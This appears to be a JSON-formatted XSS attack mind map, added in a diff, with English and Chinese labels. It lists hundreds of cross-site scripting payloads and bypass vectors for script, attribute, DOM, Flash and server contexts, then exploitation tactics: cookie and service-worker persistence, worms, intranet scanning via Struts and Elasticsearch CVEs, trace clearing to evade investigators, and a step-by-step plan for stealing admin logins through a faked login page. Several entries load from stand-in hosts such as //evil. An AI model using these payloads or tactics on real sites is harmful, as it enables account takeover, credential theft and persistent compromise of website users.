@@ -1,0 +1,685 @@
+{
+    "Found": {
+        "Trigger": {
+            "Origin": {
+                "Script context": {
+                    "quot": {
+                        "alert`1`": {},
+                        "`${alert(1)}`": {},
+                        "\\u{0000000000000061}lert(1)": {},
+                        "setTimeout(name)": {},
+                        "-{valueOf:location,toString:[].pop,0:/javascript:alert%281%29/.source,length:1} (IE)": {},
+                        "Break": {
+                            "eat backlash: %bb\"alert(1) (GBK charset)": {
+                                "prerequisite: \" => \\\"": {}
+                            },
+                            "\"<!--<script>\"": {
+                                "after: <img src=\"--></script><svg/onload=alert(1)//\">": {
+                                    "Single param vector: <img src=\"--></script><svg/onload=alert(1)//\"><!--<script>": {}
+                                }
+                            }
+                        }
+                    },
+                    "comment": {
+                        "//[10,13,8232(utf-8),8233(utf-8)]alert(1)//": {},
+                        "*/alert(1)/*": {},
+                        "Break (IE)": {
+                            "/*@cc_on-alert(1))": {},
+                            "//@cc_on-alert(1))": {}
+                        }
+                    }
+                },
+                "Attribute": {
+                    "quot": {
+                        "\"autofocus/onfocus=alert(1)//": {},
+                        "\"oncut=alert(1)//": {},
+                        "'onclick=alert(1)//": {}
+                    },
+                    "inline-script": {
+                        "HTML entities": {
+                            "Named": {
+                                "onclick=\"delFeedback('2&apos)alert(1)//')\"": {},
+                                "onclick='addUser(\"23&quot)alert(1)//\")'": {}
+                            },
+                            "Oct": {
+                                "onclick='addUser(\"23&#000000000034)-alert(1)//\")'": {}
+                            }
+                        },
+                        "VBScript (IE <= 9)": {
+                            "<a language=vbs onclick='addUser(\"11\\\"&alert(1)\\\"\")'>add</a>": {}
+                        }
+                    },
+                    "href": {
+                        "JS URI": {
+                            "URL encode": {
+                                "javascript:alert%281%29": {
+                                    "Adv: javascript:%E2%80%A8alert`1`": {}
+                                }
+                            },
+                            "HTML entities": {
+                                "Named": {
+                                    "javascript&colon;alert(1)": {},
+                                    "&newLine;javascript:alert(1)": {},
+                                    " javascript:alert&lpar;1&rpar;": {}
+                                },
+                                "Oct ": {
+                                    "java&#0000000000000000115;cript:name": {}
+                                },
+                                "Hex": {
+                                    "java&#x000000000000000073;cript:name": {}
+                                }
+                            }
+                        },
+                        "DATA URI (Firefox)": {
+                            "base64": {
+                                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==": {}
+                            },
+                            "whitespace": {
+                                "data:text/html,< sc r i p t >alert(1)</sc r ip t>": {}
+                            },
+                            "Invalid mime-type": {
+                                "data:),<script>alert(1)</script>": {}
+                            },
+                            "charset": {
+                                "data:text/html;charset=utf-8,<h1>abc": {}
+                            },
+                            "mix": {
+                                "data&colon;%2f%2f;ba se64;;//,P HNjcmlw dD5hbG VydC gxKTwvc2NyaXB0Pg= =": {}
+                            }
+                        },
+                        "VBScript URI (IE <= 10)": {
+                            "vbscript:Msgbox+1": {}
+                        }
+                    },
+                    "style (IE)": {
+                        "behavior": {
+                            "<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">click</a> (IE <= 8)": {},
+                            "<input style=\"behavior: url(xss.txt)\"> (IE <= 10)": {
+                                "xss.txt: <scriptlet> <implements type=\"behavior\"/> <script>alert(1)</script> </scriptlet>": {}
+                            },
+                            "1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a> (IE <= 9)": {},
+                            "1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe> (IE <= 9)": {
+                                "vml.xml: <xml> <rect style=\"height:100%;width:100%\" id=\"xss\" onmouseover=\"alert(1)\" strokecolor=\"white\" strokeweight=\"2000px\" filled=\"false\" /> </xml>": {}
+                            }
+                        },
+                        "expression": {
+                            "font-family:a/**/ression(alert(1))('\\')exp\\')": {},
+                            "font-family:expression(alert)(1)": {},
+                            "expr\\65ssion(alert(1))": {}
+                        }
+                    }
+                },
+                "Context": {
+                    "Prior tag": {
+                        "Fuzz vector": {
+                            "{tag}<img name=\"{/tag} <img src=xx:x onerror=alert({{i}})//\">": {},
+                            "{tag}<!--{/tag}<img src=xx:x onerror=alert(1) -->": {}
+                        },
+                        "Result": {
+                            "<xmp><% </xmp><img alt='%></xmp><img src=xx:x onerror=alert(1)//'> (IE <= 9)": {}
+                        }
+                    },
+                    "Token": {
+                        "标签名结束符": {
+                            "<svg[9,10,12,13,32,47]onload=alert(1)>": {}
+                        },
+                        "属性分隔符": {
+                            "<img src=x[9,10,12,13,32]onerror=\"alert(1)\">": {}
+                        },
+                        "属性值": {
+                            "<! XSS=\"><img src=xx:x onerror=alert(1)//\">": {},
+                            "alt=``onload=alert(1)": {},
+                            "alt=' \" name='onerror=alert()//'": {},
+                            "href=[0x0b]\" onclick=alert(1)//": {}
+                        },
+                        "属性名": {
+                            "<x '=\"foo\"><x foo='><img src=x onerror=alert(1)//'>（IE 6-8）": {},
+                            "<input value=\"<script>alert(1)</script>\" ` />": {}
+                        }
+                    },
+                    "Magic tag": {
+                        "Object": {
+                            "<object data=//pkav/test.swf><param name=movie value=//pkav/test.swf><param name=allowscriptaccess value=always></object>": {}
+                        },
+                        "SVG": {
+                            "<svg><script/xlink:href=data:,alert(1)></script>": {},
+                            "<svg contentScriptType=text/vbs><script>MsgBox\"1\"<i>（IE <= 10）": {},
+                            "<svg><script>alert&lpar;1&rpar;</script>": {},
+                            "<svg></ y=\"><x\" onload=alert(1)>": {},
+                            "<svg><style>*{font-family:'<svg onload=alert(1)>';}</style></svg>": {}
+                        },
+                        "Math": {
+                            "<math xlink:href=javascript:..>": {},
+                            "<math><a xlink:href=javascript:...>": {},
+                            "<math><style>*{font-family:'<img/src=xx:x onerror=alert(1)>'}</style>": {}
+                        },
+                        "Link": {
+                            "<link rel=import href=//evil>": {
+                                "1. Access-Control-Allow-Origin:*": {},
+                                "2. echo '<svg/onload=alert(1)>'": {}
+                            },
+                            "<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d>（IE）": {}
+                        },
+                        "Iframe": {
+                            "<iframe srcdoc='&lt;svg/onload=alert(1)&gt;'>": {
+                                "Adv: <iframe srcdoc=\"&lt;iframe srcdoc='&amp;lt;iframe onload=alert(1)&amp;gt;'&gt;\"></iframe>": {}
+                            },
+                            "<iframe src=\"data:),<script>alert(document.domain)</script>\"></iframe>（Firefox）": {}
+                        },
+                        "Embed": {
+                            "<embed src=evil.swf allowscriptaccess=always>": {},
+                            "<embed code=evil.swf allowscriptaccess=always> （Chrome）": {}
+                        },
+                        "base": {
+                            "<base href=\"/\\evil\">": {}
+                        },
+                        "!": {
+                            "<!--><svg onload=alert(1)> -->": {},
+                            "<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>（IE 6-9）": {},
+                            "<![if<iframe/onload=alert(1)//]>": {},
+                            "<![CDATA": {},
+                            "<!doctype": {}
+                        },
+                        "%": {
+                            "<% contenteditable onresize=alert(1)>（IE 11, 9 mode）": {}
+                        },
+                        "?": {
+                            "<? '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>（IE 6-9）": {}
+                        }
+                    },
+                    "Special char": {
+                        "<[00]script>alert(1)</[00]script> (IE <= 9)": {}
+                    },
+                    "Special charset": {
+                        "UTF-7: +ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-（IE）": {}
+                    }
+                }
+            },
+            "DOM": {
+                "Javascript": {
+                    "Input": {
+                        "location": {
+                            "location.href": {},
+                            "location.search": {
+                                "IE don't URL encode <>": {}
+                            },
+                            "location.hash": {},
+                            "location.pathname": {}
+                        },
+                        "window.name": {},
+                        "document.cookie": {},
+                        "localStorage": {},
+                        "document.title": {},
+                        "getAttribute": {},
+                        "document.referrer": {},
+                        "innerText": {},
+                        ".value": {},
+                        ".dataset": {},
+                        "postMessage": {
+                            "Use backlash(\\) bypass origin check code": {}
+                        },
+                        "innerHTML": {
+                            "MXSS": {
+                                "<b><noscript><a src='x' style='x:\\3c\\2fnoscript\\3e\\3ciframe/onload\\3d alert(1)\\3e'> (IE11, 0.0.2)": {},
+                                "<listing>&lt;img src=1 onerror=alert(1) &gt;</listing>": {},
+                                "<img src=\"test.jpg\" alt =\"``onload=xss()\">": {},
+                                "<pkav xmlns=\"><iframe onload=alert(1)\">123</pkav>": {},
+                                "<p style=\"font-family:'ar\\27 \\3bx\\3a expression\\28xss\\28\\29\\29\\3bial';\"></p>": {},
+                                "<img src=1 style=\"font-fam\\22onerror\\3d alert\\28 1\\29\\20 ily:'aaa';\">": {},
+                                "<% a=%&gt&lt;iframe/onload=alert(1)//>": {},
+                                "<img =\"><script>alert(1)</script>\">": {},
+                                "<div='/x=&quot;&#39&gt;&lt;iframe/onload=alert(1)&gt;'>": {},
+                                "<a href=\"&#x3000;javascript:alert(1)\">click</a>": {}
+                            }
+                        }
+                    },
+                    "Trigger": {
+                        "location": {
+                            "location='javasc&#114ipt&#58alert&#40~1&#41'（IE）": {}
+                        },
+                        "eval": {},
+                        "innerHTML": {},
+                        "document.write": {},
+                        "appendChild": {},
+                        "Function": {},
+                        "setTimeout": {},
+                        "setInterval": {},
+                        "createElement": {
+                            "with(document)body.appendChild(createElement('iframe onload=&#97&#108&#101&#114&#116(1)>')),body.innerHTML+='' (IE)": {}
+                        }
+                    }
+                },
+                "jQuery": {
+                    "Input": {
+                        ".attr": {},
+                        ".data": {},
+                        ".ajax": {},
+                        ".get": {},
+                        ".post": {},
+                        ".val": {}
+                    },
+                    "Trigger": {
+                        ".html": {},
+                        ".append": {},
+                        ".getScript": {},
+                        ".ajax": {
+                            "dataType:'script'": {}
+                        },
+                        ".get": {
+                            "content-type:text/javascript": {},
+                            "$.get('data:/javascr\\ript,alert(1)') (firefox)": {}
+                        },
+                        "$(": {},
+                        "jQuery(": {}
+                    }
+                },
+                "React.js": {
+                    "Trigger": {
+                        "React.createElement": {}
+                    }
+                },
+                "AngularJS": {
+                    "<b class=\"ng-include:'//evil''\">": {},
+                    "<iframe ng-src=javascript:..>": {},
+                    "Trigger": {
+                        "angular.element": {}
+                    }
+                }
+            },
+            "Flash": {
+                "Input": {
+                    "loaderInfo.parameters": {
+                        "Ignore invalid URL encode:              %Ajava%B&script:alert(1)": {}
+                    },
+                    "SharedObject": {
+                        "getLocal": {}
+                    },
+                    "LocalConnection": {
+                        "allowDomain(\"*\")": {}
+                    },
+                    "HTML id attribute（IE）": {
+                        "<object id='pk\"),alert(1),(\"av' data=//target.swf ..": {}
+                    },
+                    "Security.allowDomain(\"*\")": {}
+                },
+                "Trigger": {
+                    "ExternalInterface.call": {
+                        "arg 1：alert(1)": {},
+                        "arg 2": {
+                            "\\\"))}catch(e){alert(1)}//": {},
+                            "split bug": {
+                                "1. ?q=%ED%A0%80\\\"))}catch(e){alert(1)}//": {},
+                                "2. var q:String=loaderInfo.parameters[\"q\"].split(\"\\\\\").join(\"\\\\\\\\\");": {},
+                                "3. ExternalInterface.call(\"console.log\",q);": {}
+                            }
+                        }
+                    },
+                    "htmlText": {
+                        "<img src=evil.swf>": {},
+                        "<a href=javascript:...>me</a>": {}
+                    },
+                    "navigateToURL": {},
+                    "Loader": {},
+                    "addCallback": {}
+                }
+            },
+            "Server": {
+                "Applocation": {
+                    "Purifier": {
+                        "style=xss:'\"/onclick=alert(1)//'": {
+                            "style=\"xss:'\" onclick=\"alert(1)//'\"": {}
+                        },
+                        "<embed allowscriptaccess=\"alwalwaysays\" src=\"test.swf\">": {},
+                        "<sc<script>ript>alert(1)</script>": {},
+                        "alt= onclick=alert(1)": {
+                            "alt=\"\"onclick=\"alert(1)\"": {}
+                        }
+                    },
+                    "Filter": {
+                        "emoji": {}
+                    },
+                    "Logic": {
+                        "length": {}
+                    }
+                },
+                "Database": {
+                    "charset": {
+                        "<img src=\"xx# onerror=alert(1)//{0xf09d8c86}\">": {}
+                    },
+                    "data type": {
+                        "Text": {
+                            "<a href=\"xxx# onclick=alert(1)//[64kb]\"></a>": {}
+                        },
+                        "VARCHAR": {
+                            "<a href=\"xxx# onclick=alert(1)//[255]\"></a>": {}
+                        }
+                    }
+                }
+            }
+        },
+        "Input": {
+            "Mail": {
+                "附件": {
+                    "预览": {
+                        "Word 字体": {}
+                    },
+                    "标题": {}
+                },
+                "正文": {},
+                "标题": {},
+                "抄送人": {}
+            },
+            "Flash file": {
+                "SwfUpload": {},
+                "ZeroClipboard": {},
+                "JWPlayer": {},
+                "Open flash chart": {}
+            },
+            "Javascript File": {},
+            "Image Exif": {},
+            "Feedback": {
+                "<img src=//evil-DNS>": {},
+                "</script/</textarea/\"'><img..": {}
+            },
+            "URL Param": {
+                "Google Search": {
+                    "site:qq.com inurl:?id= -\"disucz\"": {}
+                },
+                "Traffic monitor": {
+                    "Browser Extend": {},
+                    "VPN": {},
+                    "HTTP proxy": {}
+                },
+                "Custom Spider": {}
+            },
+            "Upload": {
+                "xss.svg": {},
+                "xss.swf": {},
+                "xss.xml": {},
+                "xss.evt": {},
+                "xss.xxe": {},
+                "xss.jar (Firefox)": {
+                    "<iframe src=\"jar://html5sec.org/test.jar!/test.html\"></iframe>": {}
+                },
+                "xss.txt": {
+                    "start with: <script>": {}
+                }
+            }
+        },
+        "Tool": {
+            "Charles": {
+                "Mapping local JS file": {}
+            },
+            "Fiddler": {
+                "Set cookies header": {}
+            },
+            "Chrome DevTools": {
+                "global code search": {
+                    "OS X: ALT + COMMAND + F": {},
+                    "Windows:  CTRL + SHIFT+ F": {}
+                }
+            },
+            "Firebug-Lite": {},
+            "IE 恶搞迷": {},
+            "ViewWizard": {},
+            "html5sec.org/innerhtml/": {},
+            "shazzer.co.uk/": {}
+        }
+    },
+    "POC": {
+        "Remove referer": {
+            "<iframe src=\"javascript:'<script src=//pkav></script>'\">": {},
+            "<meta name=referrer content=never>": {},
+            "<a href=//target rel=noreferer target=pkav>click</a>": {
+                "<iframe name=pkav>": {}
+            }
+        },
+        "Bypass length limit": {
+            "HTML payload": {
+                "<svg/onload=eval(name)>": {},
+                "<i/onclick=URL=name>": {},
+                "<script/src=//⒕₨": {
+                    "after: </script>": {}
+                }
+            },
+            "JS payload": {
+                "$(name)": {
+                    "prerequisite: jQuery": {}
+                }
+            },
+            "Parameters patchwork": {
+                "Multiple input": {
+                    "1.<script>/*": {},
+                    "2. */alert(1)/*": {},
+                    "3. */</script>": {}
+                },
+                "HPP": {
+                    "id=<script/": {},
+                    "&id=/src=//evil#": {},
+                    "&id=></script>": {}
+                }
+            }
+        },
+        "Bypass browser XSS filter": {
+            "Chrome (Webkit)": {
+                "Upload file": {
+                    "<link rel=import href=/upload/.....>": {},
+                    "<script src=/upload/...></script>": {}
+                }
+            },
+            "IE": {
+                "<a href=\"?xss=<script>alert(1)</script>\">click</a>": {},
+                "PHP：<script/%00%00v%00%00>alert(1)</script>": {
+                    "prerequisite: %00 => \\0": {}
+                }
+            },
+            "common": {
+                "多个输入点合并": {},
+                "复合参数组合": {},
+                "DOM write": {
+                    "HTML HEX encode": {}
+                }
+            }
+        },
+        "Break IE Flash document protection": {
+            "location='javascript:\"<script>alert(document)</script>\"'": {}
+        },
+        "Break <a> area": {
+            "display:block;position:absolute;top:0;left:0;width:1000px;height:1000px;background:red": {}
+        },
+        "InnerHTML exec JS": {
+            "Non-equal：-<script/defer>alert(1)</script>": {},
+            "<iframe/src=about:blank onload=alert(1)>": {}
+        },
+        "Cross to other subdomain": {
+            "document.domain='qq.com'": {}
+        },
+        "Define variable in advance": {
+            "alert(username);function username(){} (IE)": {}
+        },
+        "CSP bypass": {
+            "<link rel=import href=test.png>": {}
+        },
+        "Upload File header check bypass": {
+            "SWF": {
+                "FWS ='BACONBACON'-alert(1)//": {}
+            },
+            "GIF": {
+                "GIF89a= 'MUMBOJUMBOBOGUSBACON';alert(1)//": {},
+                "GIF89a/*[all lzw data]*/\\x3Bjavascript_payload": {}
+            }
+        },
+        "IE downgrade vector": {
+            "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=7\" />": {},
+            "Bypass IE xss filter: <meta content=\"whatever=EmulateIE7\" http-equiv=\"X-UA-Compatible\">)": {}
+        },
+        "Flash reflect XSS convert Store XSS ": {
+            "<object data=\"[evil swf]\"> ||allowScriptAccess = samedomain": {}
+        },
+        "IE content-type sniff spoof": {
+            "/json?a.html": {},
+            "/json/.html": {},
+            "/json;.html": {}
+        },
+        "Cross domain traditional data": {
+            "window name": {
+                "window.name": {
+                    "1. window.name='exp'": {},
+                    "2. location='//target'": {}
+                },
+                "<iframe src=\"target\" name=\"exp\">": {},
+                "<a href=\"//target\" target=\"exp\">": {}
+            },
+            "location.hash": {}
+        },
+        "Hook variable via ID attribute": {
+            "<form id=\"window\"><input name=\"name\">": {},
+            "<a href=\"123\" id=\"x\">test</a>": {
+                "<script>x='javascript:alert(1)'</script> (IE)": {},
+                "<script>x.toString()=='123'</script>": {}
+            }
+        },
+        "Block Script tag via Webkit XSS auditor": {
+            "?abc=<script>[page data]</script>": {}
+        }
+    },
+    "Exp": {
+        "Sump": {
+            "<iframe style=display:none src=//xss></iframe>": {},
+            "history.replaceState + redirect": {}
+        },
+        "Worm": {
+            "Infect old data": {},
+            "%E2%80%A8": {}
+        },
+        "Persistence XSS": {
+            "Rootkit": {
+                "Cookies": {
+                    "Prevent expired: Set max-age=99999999": {},
+                    "Prevent overwritten: Set domain field to top-domain  ": {},
+                    "CRLF Inject set-cookie": {}
+                },
+                "Flash SharedObject": {
+                    "setLocal": {}
+                },
+                "LocalStorage": {
+                    "setItem": {}
+                },
+                "ServiceWorker + JSONp": {
+                    "navigator.serviceWorker.register": {}
+                },
+                "HTML5  Appcache": {
+                    "<html manifest='/a.appcache'>": {}
+                }
+            },
+            "Frame page": {
+                "1. No border iframe": {},
+                "2. Address bar sync": {
+                    "historty.pushState": {},
+                    "location.hash": {}
+                }
+            },
+            "Opener hijack": {
+                "opener.eval(...exp...)": {}
+            },
+            "Open window event hook": {
+                "<a target=_blank>": {},
+                "<form target=_blank>": {},
+                "window.open": {}
+            },
+            "HTTP response cache": {
+                "HPP": {}
+            }
+        },
+        "Intranet border": {
+            "XSS-Proxy": {
+                "Inject XSS code to all some origin frame": {},
+                "Local transfer HTTP proxy": {}
+            },
+            "XSS-Intranet": {
+                "Jar virus": {},
+                "Ajax scan Intranet": {
+                    "Struts 2: 80/8080": {
+                        "CVE-2013-2251": {},
+                        "CVE-2014-0094": {
+                            "Patch bypass": {}
+                        },
+                        "CVE-2011-3923": {},
+                        "CVE-2013-1965": {},
+                        "CVE-2013-1966": {}
+                    },
+                    "Elasticsearch: 9200": {
+                        "CVE-2014-3120": {},
+                        "CVE-2015-1427": {}
+                    }
+                }
+            }
+        },
+        "Local border": {
+            "Browser": {
+                "Trusting-zone": {},
+                "Privileged-zone": {}
+            },
+            "Inner-webview": {
+                "IOS": {
+                    "Local File bypass SOP": {}
+                },
+                "Andriod": {},
+                "PC": {}
+            }
+        },
+        "Anti-Tracking": {
+            "Still work": {
+                "Detect tab is active: document.hidden": {},
+                "Detect Local proxy": {
+                    "BurpSuite:8080": {
+                        "127.0.0.1:8080/history": {}
+                    },
+                    "Charles:8080": {},
+                    "Fiddler:8888": {}
+                },
+                "Detect devtools": {
+                    "npm install devtools-detect": {}
+                }
+            },
+            "Check referer": {
+                "response jQuery": {},
+                "IP add to blacklist": {}
+            },
+            "XSS Proxy server": {
+                "EXP": {},
+                "Message": {},
+                "Data receive": {},
+                "Keep session": {}
+            },
+            "Clear trace": {
+                "Clear console：console.clear": {},
+                "Clear address bar：history.replaceState": {}
+            },
+            "Use WebSocket replace Http": {},
+            "Use Flash execute JS": {}
+        },
+        "Info collection": {
+            "Ajax  get current page data": {},
+            "WebRTC get Gateway info": {
+                "VPN": {},
+                "Intranet IP": {}
+            },
+            "All link: document.links": {},
+            "Replay cookies": {
+                "Custom X-Forword-for bypass IP  limit": {},
+                "Use Http Proxy replay, prevent cookie domain field wrong": {}
+            },
+            "Steal Admin login info": {
+                "1. hook all link click event": {},
+                "2. each path filed remove cookie": {},
+                "3. multiple call history.pushState, prevent go back.": {},
+                "4. ajax get login page": {},
+                "5. clear DOM：document.open": {},
+                "6. write login page": {},
+                "6. set document.title": {},
+                "7. 500ms defer bind steal event to all form": {}
+            }
+        }
+    }
+}
